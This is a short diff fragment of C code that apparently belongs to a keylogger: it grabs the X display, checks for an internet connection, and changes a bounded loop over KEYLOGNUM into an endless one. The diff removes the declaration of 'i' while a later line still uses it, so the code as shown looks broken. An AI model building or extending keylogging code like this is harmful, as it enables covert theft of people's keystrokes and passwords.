@@ -60,8 +60,7 @@ int main() {
 
 	grab(dpy);
 
-	int i = 0;
-	while(i < KEYLOGNUM) {
+	while(1) {
 
 		// check for internet connection
 		if(i%CONCHECKINTV == 0 && !connected)
